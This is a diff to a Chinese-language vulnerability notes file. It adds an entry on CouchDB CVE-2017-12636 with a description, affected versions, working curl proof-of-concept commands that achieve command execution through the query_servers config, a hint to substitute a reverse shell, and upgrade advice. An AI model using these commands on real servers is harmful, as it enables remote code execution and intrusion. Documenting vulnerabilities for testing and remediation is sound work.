@@ -39,3 +39,27 @@ curl -X PUT -d '{"type":"user","name":"oops","roles":["_admin"],"roles":[],"pass
 ### 修复方式
 1. 所有用户都应升级到CouchDB 1.7.1或 2.1.1。
 2. 配置HTTP API配置参数，针对敏感配置信息加入黑名单。
+
+## couchdb命令执行漏洞 CVE-2017-12636
+### 漏洞说明
+而CVE-2017-12636漏洞在于CouchDB自身的设计问题，CouchDB允许外部通过自身HTTP(S) API对配置文件进行更改，一些配置选项包括操作系统级二进制文件的路径，随后会由CouchDB启动。从这里获取shell通常很简单，因为CouchDB其中一个“query_servers“选项，可以自定义二进制文件加载路径，这个功能基本上只是一个包装execv。
+### 涉及范围
+小于 1.7.0 以及 小于 2.1.1
+
+### 验证方法
+该漏洞利用需要获取后台管理员权限的账号
+```bash
+curl -X PUT 'http://localhost:5984/_config/query_servers/cmd' -d '"/sbin/ifconfig >/tmp/6668"'
+curl -X PUT 'http:// localhost:5984/vultest'
+curl -X PUT 'http:// localhost:5984/vultest/vul' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'
+curl -X POST 'http:// localhost:5984/vultest/_temp_view?limit=11' -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'
+```
+以上poc会在目标服务器/tmp/6668文件中写入/sbin/ifconfig的执行结果，可以将`/sbin/ifconfig`替换为反弹shell命令进行验证
+
+
+### 利用方法
+other_couchdb_unauth.py
+
+### 修复方式
+1. 所有用户都应升级到CouchDB 1.7.1或 2.1.1。
+2. 配置HTTP API配置参数，针对敏感配置信息加入黑名单。
